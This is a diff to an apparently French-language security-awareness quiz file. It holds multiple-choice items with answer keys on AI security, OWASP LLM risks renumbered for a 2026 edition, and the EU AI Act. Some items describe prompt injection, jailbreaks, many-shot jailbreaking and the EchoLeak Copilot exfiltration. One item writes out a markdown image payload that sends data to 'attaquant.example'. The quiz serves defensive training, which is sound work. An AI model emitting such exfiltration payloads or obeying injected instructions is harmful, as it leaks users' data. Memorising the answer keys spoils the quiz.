@@ -55,21 +55,86 @@ window.QUESTIONS.push(
   {"theme":"iasecu","level":"recrue","format":"single","q":"Tu reçois un mail sans aucune faute, qui cite ton projet en cours et te demande de valider une facture via un lien. Tu…","a":["Cliques, puisqu'il cite ton projet et ne contient aucune faute","Réponds au mail pour demander à l'expéditeur si c'est bien lui","Survoles le lien et cliques si l'adresse te semble correcte","Vérifies la demande par un autre canal et signales le mail s'il est suspect"],"g":3,"e":"Grâce à l'IA, un phishing peut être parfait et personnalisé. L'absence de fautes n'est plus un indice fiable : on vérifie la demande elle-même."},
   {"theme":"iasecu","level":"recrue","format":"multi","q":"Quels indices peuvent trahir une vidéo deepfake ? (plusieurs réponses)","a":["Des clignements d'yeux ou mouvements de lèvres peu naturels","Des contours du visage flous qui « bavent »","Une demande urgente et inhabituelle","Une image en haute définition"],"g":[0,1,2],"e":"Défauts visuels et contexte suspect (urgence, demande inhabituelle) sont des signaux d'alerte. La haute définition, elle, ne prouve rien : les deepfakes récents peuvent être très nets."},
   {"theme":"iasecu","level":"recrue","format":"single","q":"Une extension de navigateur « IA » gratuite demande à lire le contenu de toutes les pages que tu visites. Quel est le risque ?","a":["Qu'elle récupère le contenu de tes mails, documents et applications métier","Qu'elle ralentisse un peu ton navigateur, sans plus","Aucun, les extensions sont vérifiées une par une par ton entreprise","Qu'elle bloque les mises à jour automatiques du navigateur"],"g":0,"e":"Avec ce droit, l'extension peut lire tout ce qui s'affiche, y compris des données confidentielles, et les envoyer ailleurs. On n'installe que les extensions autorisées."},
-  {"theme":"iasecu","level":"hero","format":"single","q":"Dans l'OWASP Top 10 for LLM Applications 2025, quel risque est classé en première position (LLM01) ?","a":["La divulgation d'informations sensibles","L'empoisonnement des données","L'injection de prompt","La consommation illimitée de ressources"],"g":2,"e":"LLM01:2025 est l'injection de prompt. La divulgation d'informations sensibles est LLM02 et la consommation illimitée LLM10."},
+  {
+   "theme": "iasecu",
+   "level": "hero",
+   "format": "single",
+   "q": "Dans l'OWASP Top 10 for LLM Applications 2026, quel risque est classé en première position (LLM01) ?",
+   "a": [
+    "La divulgation d'informations sensibles",
+    "L'empoisonnement des données",
+    "L'injection de prompt",
+    "La consommation illimitée de ressources"
+   ],
+   "g": 2,
+   "e": "LLM01:2026 reste l'injection de prompt, comme en 2025. La divulgation d'informations sensibles est LLM02, l'empoisonnement des données LLM05 et la consommation illimitée LLM06 (elle était LLM10 en 2025)."
+  },
   {"theme":"iasecu","level":"hero","format":"single","q":"Dans Microsoft 365, quel outil peut empêcher un utilisateur de coller des données sensibles dans un site d'IA générative ?","a":["Microsoft Entra Privileged Identity Management","Microsoft Purview (prévention de la perte de données)","Les liens fiables (Safe Links) de Defender for Office 365","Les stratégies de conformité Intune"],"g":1,"e":"La DLP de Microsoft Purview, notamment sur les postes (Endpoint DLP), peut bloquer ou avertir lors du collage ou de l'envoi de données sensibles vers des sites d'IA."},
   {"theme":"iasecu","level":"hero","format":"tf","q":"Un chatbot connecté aux documents internes peut révéler à un utilisateur des informations qu'il ne devrait pas voir si les droits d'accès ne sont pas appliqués lors de la recherche.","a":["Vrai","Faux"],"g":0,"e":"Vrai : si la récupération ne filtre pas selon les permissions de l'utilisateur, le modèle peut restituer n'importe quel document indexé. C'est une cause classique de fuite."},
   {"theme":"iasecu","level":"hero","format":"multi","q":"Quelles mesures réduisent le risque d'injection de prompt indirecte dans un agent IA ? (plusieurs réponses)","a":["Donner à l'agent le minimum de droits nécessaires","Exiger une validation humaine avant les actions sensibles","Traiter tout contenu externe (mails, pages web) comme non fiable","Utiliser un modèle plus gros"],"g":[0,1,2],"e":"On ne sait pas encore empêcher totalement l'injection : on limite donc ses conséquences (moindre privilège, validation humaine, séparation des données non fiables). La taille du modèle ne protège pas."},
   {"theme":"iasecu","level":"hero","format":"order","q":"Déployer un nouvel outil d'IA de façon sécurisée, dans l'ordre :","items":["Recenser le besoin métier","Évaluer le fournisseur (hébergement, usage des données, conditions)","Faire valider par la sécurité et le DPO","Configurer les accès et la protection des données","Former les utilisateurs et publier les règles d'usage"],"e":"On part du besoin, on évalue le risque fournisseur, on obtient les validations, on configure, puis on accompagne les utilisateurs. Proposer une alternative validée réduit aussi le shadow AI."},
   {"theme":"iasecu","level":"hero","format":"input","q":"Quel mot anglais désigne le fait de contourner les garde-fous d'une IA par des consignes détournées (jeu de rôle, « mode développeur »…) pour obtenir ce qu'elle doit refuser ?","placeholder":"Un mot anglais…","answers":["jailbreak","jailbreaking","un jailbreak"],"e":"Un jailbreak vise les règles de sécurité du modèle lui-même, souvent par l'utilisateur. L'injection de prompt, elle, détourne l'application qui utilise le modèle."},
-  {"theme":"iasecu","level":"super","format":"single","q":"Quel scénario illustre le risque LLM05 « Improper Output Handling » de l'OWASP ?","a":["Un utilisateur obtient une recette interdite par jeu de rôle","La réponse du modèle, insérée sans échappement dans une page, déclenche un XSS","Un fournisseur de modèle subit une panne et l'application ne répond plus","Le modèle invente une référence bibliographique qu'un utilisateur cite ensuite"],"g":1,"e":"LLM05 concerne la sortie du modèle transmise sans validation à d'autres composants (navigateur, shell, SQL). La sortie d'un LLM doit être traitée comme une entrée non fiable."},
-  {"theme":"iasecu","level":"super","format":"single","q":"Face au risque LLM07 « System Prompt Leakage », quelle est la bonne pratique ?","a":["Rédiger le prompt système en anglais pour le cacher","Ajouter au prompt une consigne interdisant au modèle de le révéler","Chiffrer le prompt système en AES avant de l'envoyer au modèle","N'y placer aucun secret (clé API, identifiant, règle d'autorisation)"],"g":3,"e":"Un prompt système finit souvent par fuiter. Il ne doit contenir ni secrets ni contrôles de sécurité : ceux-ci doivent être appliqués en dehors du modèle."},
-  {"theme":"iasecu","level":"super","format":"single","q":"Le risque LLM10 « Unbounded Consumption » couvre notamment…","a":["Des requêtes en masse qui saturent le service ou font exploser la facture","La consommation électrique et en eau des centres de données qui hébergent le modèle","Le stockage illimité de l'historique des conversations de chaque utilisateur","L'usage d'une même licence d'IA par un trop grand nombre de salariés"],"g":0,"e":"LLM10 regroupe le déni de service, l'explosion des coûts d'inférence (« denial of wallet ») et l'extraction de modèle par requêtes massives. Parades : quotas, limitation de débit, surveillance."},
+  {
+   "theme": "iasecu",
+   "level": "super",
+   "format": "single",
+   "q": "Quel scénario illustre le risque « Improper Output Handling » de l'OWASP (LLM10:2026, ex-LLM05 en 2025) ?",
+   "a": [
+    "Un utilisateur obtient une recette interdite par jeu de rôle",
+    "La réponse du modèle, insérée sans échappement dans une page, déclenche un XSS",
+    "Un fournisseur de modèle subit une panne et l'application ne répond plus",
+    "Le modèle invente une référence bibliographique qu'un utilisateur cite ensuite"
+   ],
+   "g": 1,
+   "e": "Ce risque (LLM10 dans l'édition 2026, LLM05 en 2025) concerne la sortie du modèle transmise sans validation à d'autres composants (navigateur, shell, SQL). La sortie d'un LLM doit être traitée comme une entrée non fiable."
+  },
+  {
+   "theme": "iasecu",
+   "level": "super",
+   "format": "single",
+   "q": "Face au risque OWASP LLM08:2026 « Hidden Context Exposure » (ex-LLM07:2025 « System Prompt Leakage »), quelle est la bonne pratique ?",
+   "a": [
+    "Rédiger le prompt système en anglais pour le cacher",
+    "Ajouter au prompt une consigne interdisant au modèle de le révéler",
+    "Chiffrer le prompt système en AES avant de l'envoyer au modèle",
+    "N'y placer aucun secret (clé API, identifiant, règle d'autorisation)"
+   ],
+   "g": 3,
+   "e": "Le prompt système et le contexte caché finissent souvent par fuiter. Ils ne doivent contenir ni secrets ni contrôles de sécurité : ceux-ci doivent être appliqués en dehors du modèle. En 2026, l'OWASP a élargi ce risque à tout le contexte fourni au modèle."
+  },
+  {
+   "theme": "iasecu",
+   "level": "super",
+   "format": "single",
+   "q": "Le risque OWASP « Unbounded Consumption » (LLM06:2026, ex-LLM10 en 2025) couvre notamment…",
+   "a": [
+    "Des requêtes en masse qui saturent le service ou font exploser la facture",
+    "La consommation électrique et en eau des centres de données qui hébergent le modèle",
+    "Le stockage illimité de l'historique des conversations de chaque utilisateur",
+    "L'usage d'une même licence d'IA par un trop grand nombre de salariés"
+   ],
+   "g": 0,
+   "e": "Ce risque regroupe le déni de service, l'explosion des coûts d'inférence (« denial of wallet ») et l'extraction de modèle par requêtes massives. Parades : quotas, limitation de débit, surveillance."
+  },
   {"theme":"iasecu","level":"super","format":"tf","q":"Microsoft 365 Copilot respecte les permissions existantes : un utilisateur n'obtient que du contenu auquel il a déjà accès.","a":["Vrai","Faux"],"g":0,"e":"Vrai : Copilot s'appuie sur les droits de l'utilisateur. Le vrai risque est donc le surpartage existant, que Copilot rend soudain très facile à trouver."},
   {"theme":"iasecu","level":"super","format":"multi","q":"Quelles mesures limitent le risque de fuite de données avec Microsoft 365 Copilot ? (plusieurs réponses)","a":["Corriger le surpartage (liens « Tout le monde », sites trop ouverts) avant le déploiement","Appliquer des étiquettes de confidentialité Purview","Restreindre la découverte de contenu sur les sites SharePoint sensibles","Donner à Copilot un compte de service ayant accès à tous les sites"],"g":[0,1,2],"e":"Copilot n'affiche que ce que l'utilisateur a déjà le droit de voir : nettoyer les permissions, étiqueter les données et restreindre la découverte (Restricted Content Discovery) réduisent l'exposition. Lui donner un accès global ferait exactement l'inverse."},
   {"theme":"iasecu","level":"super","format":"order","q":"Un agent IA en production a exécuté des actions après une injection de prompt. Dans l'ordre :","items":["Détecter et confirmer l'action anormale","Suspendre l'agent ou révoquer ses droits","Analyser les journaux (prompts, contenus lus, actions)","Corriger (droits, filtrage, validation humaine)","Remettre en service sous surveillance renforcée"],"e":"Comme pour tout incident : on confine d'abord, on analyse avec les traces, on corrige la cause, puis on rétablit en surveillant."},
   {"theme":"iasecu","level":"super","format":"input","q":"Quel référentiel de MITRE recense les tactiques et techniques d'attaque visant les systèmes d'IA ?","placeholder":"Un nom…","answers":["ATLAS","MITRE ATLAS"],"e":"MITRE ATLAS (Adversarial Threat Landscape for Artificial-Intelligence Systems) complète ATT&CK avec des techniques propres à l'IA : empoisonnement, évasion, injection de prompt…"},
   {"theme":"iasecu","level":"super","format":"single","q":"Contre un phishing généré par IA qui trompe l'utilisateur, quelle mesure protège le mieux les comptes même s'il saisit ses identifiants sur un faux site ?","a":["Un code reçu par SMS","Un mot de passe plus long","Une MFA résistante au phishing (clé FIDO2, passkey)","L'approbation par notification push simple"],"g":2,"e":"FIDO2 et les passkeys sont liés au domaine légitime : un faux site ne peut pas les réutiliser. SMS et notifications push peuvent être relayés par un proxy de phishing (AiTM)."},
-  {"theme":"iasecu","level":"legende","format":"single","q":"Quel scénario relève de LLM08 « Vector and Embedding Weaknesses » (OWASP 2025) ?","a":["Un modèle répond trop lentement à cause d'embeddings de trop grande dimension","Un utilisateur contourne les garde-fous du modèle grâce à un jeu de rôle","Une base vectorielle partagée renvoie à un client les passages d'un autre client","Le modèle génère un code vulnérable qu'un développeur intègre sans relecture"],"g":2,"e":"LLM08 vise les faiblesses des bases vectorielles et embeddings : fuites entre utilisateurs ou locataires faute de contrôle d'accès, empoisonnement des données indexées, inversion d'embeddings."},
+  {
+   "theme": "iasecu",
+   "level": "legende",
+   "format": "single",
+   "q": "Quel scénario relève de LLM09:2026 « Vector and Embedding Weaknesses » (OWASP, ex-LLM08 en 2025) ?",
+   "a": [
+    "Un modèle répond trop lentement à cause d'embeddings de trop grande dimension",
+    "Un utilisateur contourne les garde-fous du modèle grâce à un jeu de rôle",
+    "Une base vectorielle partagée renvoie à un client les passages d'un autre client",
+    "Le modèle génère un code vulnérable qu'un développeur intègre sans relecture"
+   ],
+   "g": 2,
+   "e": "Ce risque (LLM09 en 2026, LLM08 en 2025) vise les faiblesses des bases vectorielles et embeddings : fuites entre utilisateurs ou locataires faute de contrôle d'accès, empoisonnement des données indexées, inversion d'embeddings."
+  },
   {"theme":"iasecu","level":"legende","format":"single","q":"EchoLeak (CVE-2025-32711), révélée en 2025 contre Microsoft 365 Copilot, était…","a":["Une fuite de mots de passe en clair dans les journaux de connexion d'Entra ID","Un deepfake vocal du PDG de Microsoft utilisé pour obtenir des virements","Une faille de Teams permettant d'écouter les réunions sans y être invité","Une injection de prompt indirecte « zéro clic » via un mail, exfiltrant des données"],"g":3,"e":"Il suffisait que Copilot traite un mail piégé pour qu'il divulgue des données internes, sans action de la victime. Microsoft l'a corrigée côté service."},
   {"theme":"iasecu","level":"legende","format":"single","q":"Une injection pousse un chatbot à écrire ![x](https://attaquant.example/p?d=<données>). Pourquoi est-ce une exfiltration ?","a":["L'interface charge l'image automatiquement : les données de l'URL partent chez l'attaquant","Le lien s'ouvre seulement si l'utilisateur clique dessus","Le texte alternatif « x » contient un script exécuté par le navigateur","Les données restent dans le cache du navigateur, lu ensuite par l'attaquant"],"g":0,"e":"Le rendu automatique des images déclenche une requête vers l'URL, données incluses. Parades : ne pas afficher d'images externes non autorisées, politique CSP stricte."},
   {"theme":"iasecu","level":"legende","format":"single","q":"Le « many-shot jailbreaking » exploite…","a":["Des milliers de comptes qui envoient la même demande pour saturer le modèle","Un long contexte rempli de faux dialogues où l'assistant cède à des demandes interdites","Des prompts qui mélangent plusieurs langues pour échapper aux filtres de sécurité","Une faille de l'API qui ignore le prompt système au-delà d'un certain nombre d'appels"],"g":1,"e":"Décrit par Anthropic en 2024 : avec suffisamment d'exemples fictifs de conformité dans le contexte, le modèle tend à les imiter et à contourner ses garde-fous."},
@@ -99,7 +164,21 @@ window.QUESTIONS.push(
   {"theme":"iaethique","level":"legende","format":"single","q":"Quand la proportion de cas positifs diffère entre deux groupes, un classifieur imparfait ne peut pas satisfaire simultanément…","a":["Une précision globale élevée et un rappel global élevé","La parité démographique et l'absence de variables proxys","L'égalité des taux de faux positifs et l'égalité des taux de vrais positifs","La calibration par groupe et l'égalité des taux de faux positifs et de faux négatifs"],"g":3,"e":"C'est le théorème d'impossibilité (Kleinberg et al., Chouldechova), mis en lumière par le débat sur COMPAS : avec des taux de base différents, être calibré dans chaque groupe et avoir les mêmes taux d'erreur est incompatible. Égaliser FPR et TPR (« equalized odds »), en revanche, est atteignable."},
   {"theme":"iaethique","level":"legende","format":"single","q":"Selon l'avis du CEPD adopté fin 2024 sur les modèles d'IA, un modèle entraîné sur des données personnelles…","a":["Est toujours anonyme, puisqu'il ne stocke que des poids numériques","N'est pas automatiquement anonyme : son anonymat s'apprécie au cas par cas","Est toujours une donnée personnelle et doit être supprimé sur demande","Échappe au RGPD dès lors qu'il est publié en open source"],"g":1,"e":"Le CEPD considère qu'un modèle n'est anonyme que si la probabilité d'extraire des données personnelles d'entraînement, directement ou par des requêtes, est insignifiante. Les attaques par inversion de modèle ou inférence d'appartenance montrent que ce n'est pas acquis."},
   {"theme":"iaethique","level":"legende","format":"multi","q":"Reconnaissance des émotions et biométrie : lesquels de ces usages figurent parmi les pratiques interdites par l'AI Act ? (plusieurs réponses)","a":["Reconnaître les émotions des salariés sur leur lieu de travail, hors raisons médicales ou de sécurité","Reconnaître les émotions des clients d'un magasin pour adapter la publicité affichée","Constituer une base de reconnaissance faciale par moissonnage non ciblé d'images sur Internet","Catégoriser des personnes par biométrie pour en déduire leur orientation sexuelle"],"g":[0,2,3],"e":"La reconnaissance des émotions n'est interdite que sur le lieu de travail et dans l'enseignement (hors raisons médicales ou de sécurité). Ailleurs, elle relève du haut risque et d'obligations d'information. Le moissonnage non ciblé d'images faciales et la catégorisation biométrique visant à déduire l'orientation sexuelle sont interdits."},
-  {"theme":"iaethique","level":"legende","format":"input","q":"Dans la version française de l'AI Act, comment s'appelle l'obligation faite aux fournisseurs et déployeurs de garantir un niveau suffisant de connaissances en IA de leur personnel ?","placeholder":"Trois mots…","answers":["maîtrise de l'IA","maitrise de l'IA","maîtrise de l'intelligence artificielle","AI literacy","littératie en IA"],"e":"La « maîtrise de l'IA » (AI literacy en anglais) impose de former les personnes qui utilisent ou font fonctionner des systèmes d'IA, en tenant compte de leur rôle et du contexte d'usage. Elle vise tous les systèmes, pas seulement le haut risque."},
+  {
+   "theme": "iaethique",
+   "level": "legende",
+   "format": "input",
+   "q": "Dans la version française de l'AI Act, comment s'appelle l'obligation faite aux fournisseurs et déployeurs de prendre des mesures pour développer les connaissances en IA de leur personnel ?",
+   "placeholder": "Trois mots…",
+   "answers": [
+    "maîtrise de l'IA",
+    "maitrise de l'IA",
+    "maîtrise de l'intelligence artificielle",
+    "AI literacy",
+    "littératie en IA"
+   ],
+   "e": "La « maîtrise de l'IA » (AI literacy en anglais) demande de former les personnes qui utilisent ou font fonctionner des systèmes d'IA, en tenant compte de leur rôle et du contexte d'usage. Depuis le « Digital Omnibus » de 2026, le texte n'exige plus de « garantir un niveau suffisant » mais de prendre des mesures pour la développer. Elle vise tous les systèmes, pas seulement le haut risque."
+  },
   {"theme":"iaethique","level":"legende","format":"single","q":"Un modèle d'IA à usage général publié sous licence libre et ouverte (poids publics), sans risque systémique, reste soumis à quelles obligations de l'AI Act ?","a":["Aucune : un modèle open source est entièrement exempté de l'AI Act","Uniquement la documentation technique destinée à l'AI Office et aux autorités","Une politique droit d'auteur et un résumé public des données d'entraînement","Les mêmes obligations qu'un modèle à risque systémique"],"g":2,"e":"L'exemption open source dispense de la documentation technique et des informations aux fournisseurs en aval, mais pas de la politique de respect du droit d'auteur ni du résumé public des données d'entraînement. Elle ne s'applique pas aux modèles à risque systémique."},
   {"theme":"iaethique","level":"legende","format":"single","q":"Selon l'AI Act, quels déployeurs de systèmes à haut risque doivent réaliser une analyse d'impact sur les droits fondamentaux (FRIA) ?","a":["Tous les déployeurs de systèmes à haut risque, quelle que soit leur taille","Uniquement les fournisseurs établis hors de l'Union qui déploient leur propre système","Seulement les déployeurs de plus de 250 salariés ou de 50 M€ de chiffre d'affaires","Les acteurs publics ou de service public, et certains usages comme la solvabilité"],"g":3,"e":"La FRIA vise les organismes de droit public, les entités privées qui fournissent des services publics, et les déployeurs de systèmes évaluant la solvabilité ou fixant les prix de l'assurance vie et santé. Elle complète, sans la remplacer, l'AIPD du RGPD."},
   {"theme":"iaethique","level":"legende","format":"tf","q":"Selon l'AI Act, un texte généré par IA et publié pour informer le public sur des questions d'intérêt public n'a pas à être signalé comme tel s'il a fait l'objet d'un contrôle humain ou éditorial et qu'une personne en assume la responsabilité éditoriale.","a":["Vrai","Faux"],"g":0,"e":"Vrai : c'est l'exception prévue à l'obligation de signaler les textes générés publiés pour informer le public. Sans relecture éditoriale assumée, la mention reste obligatoire."},
